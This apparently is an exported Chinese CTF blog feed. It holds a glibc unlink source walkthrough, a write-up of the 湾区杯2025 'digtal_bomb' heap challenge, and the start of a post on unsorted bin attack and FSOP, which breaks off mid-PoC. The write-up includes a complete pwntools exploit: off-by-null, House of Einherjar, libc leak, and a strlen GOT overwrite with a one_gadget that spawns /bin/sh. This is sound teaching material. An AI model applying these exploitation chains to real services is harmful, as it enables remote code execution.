class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs c">unlink_chunk (mstate av, mchunkptr p)<br>&#123;<br>  <span class="hljs-comment">/* 一致性检查：当前块 p 的 size 必须等于“后继物理块”的 prev_size。</span><br><span class="hljs-comment">     若不相等，说明元数据被破坏（越界写/伪造 size 等）。 */</span><br>  <span class="hljs-keyword">if</span> (chunksize (p) != prev_size (next_chunk (p)))<br>    malloc_printerr (<span class="hljs-string">&quot;corrupted size vs. prev_size&quot;</span>);<br><br>  <span class="hljs-comment">/* 取出 bin 中的前向/后向指针（双向链表）。 */</span><br>  mchunkptr fd = p-&gt;fd;<br>  mchunkptr bk = p-&gt;bk;<br><br>  <span class="hljs-comment">/* 双向链表完整性检查：</span><br><span class="hljs-comment">     - 正常应有 fd-&gt;bk == p 且 bk-&gt;fd == p</span><br><span class="hljs-comment">     - 任一不满足即链表被破坏（典型于 unsafe unlink/伪造指针）。 */</span><br>  <span class="hljs-keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="hljs-number">0</span>))<br>    malloc_printerr (<span class="hljs-string">&quot;corrupted double-linked list&quot;</span>);<br><br>  <span class="hljs-comment">/* 将 p 从（普通大小序的）bin 双向链表中摘除。 */</span><br>  fd-&gt;bk = bk;<br>  bk-&gt;fd = fd;<br><span class="hljs-comment">/* ============================================================================================================*/</span><br>  <span class="hljs-comment">/* 若 p 属于 largebin（非 smallbin），且存在按“块大小”排序的次级链表指针，</span><br><span class="hljs-comment">     还需要从“size 有序环”里把 p 摘掉。smallbin 没有 nextsize 链。 */</span><br>  <span class="hljs-keyword">if</span> (!in_smallbin_range (chunksize_nomask (p)) &amp;&amp; p-&gt;fd_nextsize != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      <span class="hljs-comment">/* 次级链表（按大小排序）的完整性检查：</span><br><span class="hljs-comment">         - 正常应有 p-&gt;fd_nextsize-&gt;bk_nextsize == p</span><br><span class="hljs-comment">         -        且 p-&gt;bk_nextsize-&gt;fd_nextsize == p */</span><br>      <span class="hljs-keyword">if</span> (p-&gt;fd_nextsize-&gt;bk_nextsize != p<br>          || p-&gt;bk_nextsize-&gt;fd_nextsize != p)<br>        malloc_printerr (<span class="hljs-string">&quot;corrupted double-linked list (not small)&quot;</span>);<br><br>      <span class="hljs-comment">/* 如果 p 被摘除后，其所属 bin 的表头 fd 没有配置次级链，</span><br><span class="hljs-comment">         则需要把 p 的次级链“移交/闭环”给 fd。 */</span><br>      <span class="hljs-keyword">if</span> (fd-&gt;fd_nextsize == <span class="hljs-literal">NULL</span>)<br>        &#123;<br>          <span class="hljs-comment">/* 情况 A：p 自身构成一个单节点的 size 环（指向自己）。</span><br><span class="hljs-comment">             摘掉 p 后，将 fd 自己设置为单节点环。 */</span><br>          <span class="hljs-keyword">if</span> (p-&gt;fd_nextsize == p)<br>            fd-&gt;fd_nextsize = fd-&gt;bk_nextsize = fd;<br>          <span class="hljs-keyword">else</span><br>            &#123;<br>              <span class="hljs-comment">/* 情况 B：p 的 size 环里有其他节点：</span><br><span class="hljs-comment">                 用 fd 替换 p 在次级环中的位置，维持有序环不破。 */</span><br>              fd-&gt;fd_nextsize = p-&gt;fd_nextsize;<br>              fd-&gt;bk_nextsize = p-&gt;bk_nextsize;<br>              p-&gt;fd_nextsize-&gt;bk_nextsize = fd;<br>              p-&gt;bk_nextsize-&gt;fd_nextsize = fd;<br>            &#125;<br>        &#125;<br>      <span class="hljs-keyword">else</span><br>        &#123;<br>          <span class="hljs-comment">/* 否则（fd 已有次级链），直接把 p 从 size 环里断开连接。 */</span><br>          p-&gt;fd_nextsize-&gt;bk_nextsize = p-&gt;bk_nextsize;<br>          p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize;<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="校验绕过"><a href="#校验绕过" class="headerlink" title="校验绕过"></a>校验绕过</h2><p>经过源码分析，我们可以利用的分支只有向前合并，总结出如下需要绕过的校验</p><ul><li>要释放的<code>chunk</code>的<code>prev_inuse</code>位为<code>0</code>（通过堆溢出、off-by-null、off-by-one进行设置）</li><li>被合并的<code>chunk</code>的size必须和释放的<code>prev_size</code>相同（由于空间复用，可以编辑当前堆块，设置下一个堆块的<code>prev_size</code>）</li><li>被合并的<code>chunk</code>的<code>fd-bk</code>和<code>bk-fd</code>必须指向自己（通过设置<code>fd</code>和<code>bk</code>都为当前堆块的地址绕过）</li></ul><h2 id="湾区杯2025-digtal-bomb"><a href="#湾区杯2025-digtal-bomb" class="headerlink" title="湾区杯2025-digtal_bomb"></a>湾区杯2025-digtal_bomb</h2><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p><code>ida</code>反编译进行简单的函数、变量重命名，然后进入<code>welcome</code>函数，发现题目介绍是实现了一个你和电脑共同排除炸弹的功能</p><p>首先分析main函数。让你输入一个炸弹范围，然后通过伪随机生成一个炸弹数，并且炸弹数控制在你输入的范围内。然后进入一个循环，会通过<code>inputgGuessNum</code>函数让你输入一个数，然后对你输入的数通过<code>chunk1</code>函数进行校验</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250910183847068.png" alt="image-20250910183846884"></p><p>我们跟进函数<code>chunk1</code>，如果我们猜的数是炸弹数，就会爆炸<code>return 1</code>，如果我们没有猜到炸弹数，就会通过<code>update_boundary</code>进行更新边界然后当仅剩一个数的时候，且这个数是炸弹数的时候，就会进入<code>heapFunc</code>函数。</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250910184611911.png" alt="image-20250910184611789"></p><p>继续跟进<code>update_boundary</code>函数，是一个更新边界的函数，通过分析我们可以实习100绕过炸弹数，开始输入<code>499-500</code>，然后随机数就会随机到<code>499</code>，然后输入<code>500</code>，边界更新为<code>499-499</code>，完成炸弹数绕过</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250910220533085.png" alt="image-20250910220525932"></p><p>接着进入函数<code>heapFunc</code>，是一个经典的堆题样式。</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250910185034168.png" alt="image-20250910185034013"></p><p>首先跟进add函数，只允许创建<code>10</code>个堆块，且有大小限制在<code>0x10-0x800</code>，申请的堆块地址储存在<code>chunk_addr</code>，然后向堆块输入数据，并在数据末位进行<code>\x00</code>截断，这里就造成了<code>off-by-null</code>漏洞</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250910185112663.png" alt="image-20250910185112515"></p><p>然后跟进<code>free</code>函数，正常的<code>free</code>，不存在<code>UAF</code>漏洞</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250910221154143.png" alt="image-20250910221154027"></p><p>跟进<code>show</code>函数，会打印堆块内容</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250910221240012.png" alt="image-20250910221239898"></p><p>最后跟进<code>edit_one</code>函数，只有一次编辑功能，且和申请的编辑不一样，不存在<code>/x00</code>截断，可以配合<code>show</code>函数进行地址泄露</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250910221340660.png" alt="image-20250910221340536"></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><ul><li>利用炸断数生成缺陷，绕过炸弹，进入heap功能</li><li>利用<code>largerbin</code>和<code>edit</code>函数泄露<code>heap</code>地址</li><li>利用<code>off-by-null</code>漏洞配合<code>house_of_einherjar</code>攻击手法造成堆块重叠</li><li>利用堆块重叠泄露地址泄露<code>libc</code>地址</li><li>利用堆块重叠修改堆块<code>fd</code>指针</li><li>打<code>libc.got</code>，修改<code>strlen</code>的<code>got</code>表为<code>onegadget</code></li></ul><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Basic PWN Template - basis Template </span><br><span class="hljs-string">Author: p0ach1l</span><br><span class="hljs-string">Date: 2025-09-09</span><br><span class="hljs-string">description: no description</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwnscript <span class="hljs-keyword">import</span> *<br><br>filename = <span class="hljs-string">&quot;./digtal_bomb&quot;</span><br>url = <span class="hljs-string">&#x27;&#x27;</span><br>gdbscript = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">  b * main</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>set_context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, endian=<span class="hljs-string">&#x27;little&#x27;</span>, timeout=<span class="hljs-number">5</span>)<br>p = pr(url=url , filename=filename , gdbscript=gdbscript , framepath=<span class="hljs-string">&#x27;&#x27;</span>)<br>elf = ELF(filename)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">choice</span>(<span class="hljs-params">idx</span>) :<br>  p.sendlineafter(<span class="hljs-string">&#x27;Your choice &gt;&gt;&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx , size , content</span>) :<br>  choice(<span class="hljs-number">1</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;Index &gt;&gt; \n&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br>  p.sendlineafter(<span class="hljs-string">&#x27;Size &gt;&gt; \n&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>  sleep(<span class="hljs-number">0.1</span>)<br>  p.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>) :<br>  choice(<span class="hljs-number">2</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;Index &gt;&gt; \n&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>) :<br>  choice(<span class="hljs-number">3</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;Index &gt;&gt; \n&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx, content</span>) :<br>  choice(<span class="hljs-number">666</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;Index &gt;&gt; \n&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br>  sleep(<span class="hljs-number">0.1</span>)<br>  p.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">begin</span>() :<br>  p.sendlineafter(<span class="hljs-string">&#x27;Enter min (0-500): &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">499</span>))<br>  p.sendlineafter(<span class="hljs-string">&quot;Enter max (0-500): &quot;</span> , <span class="hljs-built_in">str</span>(<span class="hljs-number">500</span>))<br>  p.sendlineafter(<span class="hljs-string">&quot;Your guess :&quot;</span> , <span class="hljs-built_in">str</span>(<span class="hljs-number">500</span>))<br><br>begin()<br><br>add(<span class="hljs-number">0</span> , <span class="hljs-number">0x490</span> , <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">1</span> , <span class="hljs-number">0xf8</span> , <span class="hljs-string">b&#x27;b&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">2</span> , <span class="hljs-number">0x4f0</span> , <span class="hljs-string">b&#x27;c&#x27;</span>)<br>add(<span class="hljs-number">0</span> , <span class="hljs-number">0x490</span> , <span class="hljs-string">b&#x27;d&#x27;</span>)<br>edit(<span class="hljs-number">0</span> , <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x10</span>)<br><br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x10</span>)<br>heap_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">1</span>)<br><br>add(<span class="hljs-number">7</span> , <span class="hljs-number">0xf8</span>, <span class="hljs-string">b&#x27;e&#x27;</span>)<br><br>payload = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x90</span>) + p64(heap_addr + <span class="hljs-number">0x10</span>) * <span class="hljs-number">2</span><br>add(<span class="hljs-number">0</span> , <span class="hljs-number">0x38</span> , payload)<br><br>add(<span class="hljs-number">1</span> , <span class="hljs-number">0x28</span> , <span class="hljs-string">b&#x27;g&#x27;</span>)<br>add(<span class="hljs-number">2</span> , <span class="hljs-number">0x28</span> , <span class="hljs-string">b&#x27;h&#x27;</span>)<br>add(<span class="hljs-number">3</span> , <span class="hljs-number">0xf8</span> , p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span>)<br><br>free(<span class="hljs-number">2</span>)<br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span> + p64(<span class="hljs-number">0x90</span>)<br>add(<span class="hljs-number">2</span> , <span class="hljs-number">0x28</span> , payload)<br><br>add(<span class="hljs-number">4</span> , <span class="hljs-number">0xf8</span> , <span class="hljs-string">b&#x27;i&#x27;</span>)<br>add(<span class="hljs-number">5</span> , <span class="hljs-number">0xf8</span> , <span class="hljs-string">b&#x27;j&#x27;</span>)<br>add(<span class="hljs-number">6</span> , <span class="hljs-number">0xf8</span> , <span class="hljs-string">b&#x27;k&#x27;</span>)<br>free(<span class="hljs-number">7</span>)<br>add(<span class="hljs-number">7</span> , <span class="hljs-number">0xf8</span> , <span class="hljs-string">b&#x27;l&#x27;</span>)<br>add(<span class="hljs-number">8</span> , <span class="hljs-number">0xf8</span> , <span class="hljs-string">b&#x27;m&#x27;</span>)<br>add(<span class="hljs-number">9</span> , <span class="hljs-number">0xf8</span> , <span class="hljs-string">b&#x27;n&#x27;</span>)<br>add(<span class="hljs-number">10</span>, <span class="hljs-number">0xf8</span> , <span class="hljs-string">b&#x27;o&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>, <span class="hljs-number">11</span>):<br>  free(i)<br><br>free(<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">3</span> , <span class="hljs-number">0x28</span> , <span class="hljs-string">b&#x27;a&#x27;</span>)<br><br>show(<span class="hljs-number">1</span>)<br>libc_base = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x21ace0</span> <br><br>add(<span class="hljs-number">4</span> , <span class="hljs-number">0x158</span> , <span class="hljs-string">b&#x27;f&#x27;</span>)<br>add(<span class="hljs-number">5</span> , <span class="hljs-number">0x28</span> , <span class="hljs-string">b&#x27;g&#x27;</span>)<br><br>free(<span class="hljs-number">5</span>)<br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">4</span>)<br><br>strlen_got = libc_base + <span class="hljs-number">0x21A090</span><br>fake_fd = strlen_got ^ (heap_addr &gt;&gt; <span class="hljs-number">12</span>)<br><span class="hljs-built_in">print</span>(p64(fake_fd))<br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">5</span> + p64(<span class="hljs-number">0x31</span>) + p64(fake_fd)[:-<span class="hljs-number">2</span>]<br>add(<span class="hljs-number">4</span> , <span class="hljs-number">0x158</span> , payload)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0xebc81 execve(&quot;/bin/sh&quot;, r10, [rbp-0x70])</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  address rbp-0x78 is writable</span><br><span class="hljs-string">  [r10] == NULL || r10 == NULL || r10 is a valid argv</span><br><span class="hljs-string">  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xebc85 execve(&quot;/bin/sh&quot;, r10, rdx)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  address rbp-0x78 is writable</span><br><span class="hljs-string">  [r10] == NULL || r10 == NULL || r10 is a valid argv</span><br><span class="hljs-string">  [rdx] == NULL || rdx == NULL || rdx is a valid envp</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xebc88 execve(&quot;/bin/sh&quot;, rsi, rdx)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  address rbp-0x78 is writable</span><br><span class="hljs-string">  [rsi] == NULL || rsi == NULL || rsi is a valid argv</span><br><span class="hljs-string">  [rdx] == NULL || rdx == NULL || rdx is a valid envp</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xebce2 execve(&quot;/bin/sh&quot;, rbp-0x50, r12)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  address rbp-0x48 is writable</span><br><span class="hljs-string">  r13 == NULL || &#123;&quot;/bin/sh&quot;, r13, NULL&#125; is a valid argv</span><br><span class="hljs-string">  [r12] == NULL || r12 == NULL || r12 is a valid envp</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xebd38 execve(&quot;/bin/sh&quot;, rbp-0x50, [rbp-0x70])</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  address rbp-0x48 is writable</span><br><span class="hljs-string">  r12 == NULL || &#123;&quot;/bin/sh&quot;, r12, NULL&#125; is a valid argv</span><br><span class="hljs-string">  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xebd3f execve(&quot;/bin/sh&quot;, rbp-0x50, [rbp-0x70])</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  address rbp-0x48 is writable</span><br><span class="hljs-string">  rax == NULL || &#123;rax, r12, NULL&#125; is a valid argv</span><br><span class="hljs-string">  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xebd43 execve(&quot;/bin/sh&quot;, rbp-0x50, [rbp-0x70])</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  address rbp-0x50 is writable</span><br><span class="hljs-string">  rax == NULL || &#123;rax, [rbp-0x48], NULL&#125; is a valid argv</span><br><span class="hljs-string">  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>oggs = [<span class="hljs-number">0xebc81</span> , <span class="hljs-number">0xebc85</span>, <span class="hljs-number">0xebc88</span>, <span class="hljs-number">0xebce2</span>, <span class="hljs-number">0xebd38</span>, <span class="hljs-number">0xebd3f</span>, <span class="hljs-number">0xebd4</span>]<br>ogg = libc_base + oggs[<span class="hljs-number">1</span>]<br>add(<span class="hljs-number">2</span> , <span class="hljs-number">0x28</span> , <span class="hljs-string">b&#x27;g&#x27;</span>)<br>lss(<span class="hljs-string">&quot;strlen_got&quot;</span>)<br>pause()<br><br>payload =  p64(libc_base + <span class="hljs-number">0x000000000021A090</span>) + p64(ogg)[:-<span class="hljs-number">2</span>]<br>add(<span class="hljs-number">5</span> , <span class="hljs-number">0x28</span> , payload)<br><br>lss(<span class="hljs-string">&quot;strlen_got&quot;</span>)<br>lss(<span class="hljs-string">&quot;heap_addr&quot;</span>)<br>lss(<span class="hljs-string">&quot;libc_base&quot;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>unsorted bin attack&amp;&amp;FSOP利用技巧</title>
    <link href="/2025/07/25/unsorted%20bin%20attack&amp;&amp;FSOP%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/"/>
    <url>/2025/07/25/unsorted%20bin%20attack&amp;&amp;FSOP%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/</url>
    
    <content type="html"><![CDATA[<h1 id="unsorted-bin-attack-FSOP利用技巧"><a href="#unsorted-bin-attack-FSOP利用技巧" class="headerlink" title="unsorted bin attack&amp;&amp;FSOP利用技巧"></a>unsorted bin attack&amp;&amp;FSOP利用技巧</h1><p>FSOP（File Stream Oriented Programming）的核心思想就是<strong>劫持<code>_IO_list_all</code> 的值来伪造链表和其中的<code>_IO_FILE</code> 项</strong>，但是单纯的伪造只是构造了数据，还需要某种方法进行触发。FSOP 选择的触发方法是**调用<code>_IO_flush_all_lockp</code>**，这个函数会刷新<code>_IO_list_all</code> 链表中所有项的文件流，相当于对每个 FILE 调用 fflush，也对应着会调用<code>_IO_FILE_plus.vtable</code> 中的<code>_IO_overflow</code>。</p><h2 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h2><p>unsorted bin attack可以实现在任意地址写入一个main_arena相关的地址，可以看下面部分源码分析漏洞原理。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* remove from unsorted list */</span><br>unsorted_chunks(av)-&gt;bk = bck;<br>bck-&gt;fd                 = unsorted_chunks(av);<br></code></pre></td></tr></table></figure><p>这是unsorted bin取出执行的操作，最后一句就是把取出bin的bk指针指向地址的fd指针赋值位unsorted_chunks，说着可能有点绕，看下图。</p><p><img src="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/figure/unsorted_bin_attack_order.png" alt="img"></p><p>利用poc做个测试</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;本程序演示了通过向栈上写入一个大的 unsigned long 值实现 unsorted bin 攻击\n&quot;</span>);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;实际上，unsorted bin 攻击一般用于为后续攻击做准备，&quot;</span><br>   <span class="hljs-string">&quot;例如重写 libc 中的全局变量 global_max_fast，从而进行 fastbin 攻击\n\n&quot;</span>);<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var=<span class="hljs-number">0</span>;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;首先来看一下我们想要重写的栈上变量：\n&quot;</span>);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%p: %ld\n\n&quot;</span>, &amp;stack_var, stack_var);<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">400</span>);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在，我们在堆上分配第一个正常的 chunk，地址为：%p\n&quot;</span>,p);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;再分配另一个正常的 chunk，以避免在 free() 时顶 chunk 与第一个 chunk 合并\n\n&quot;</span>);<br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">500</span>);<br><br><span class="hljs-built_in">free</span>(p);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span 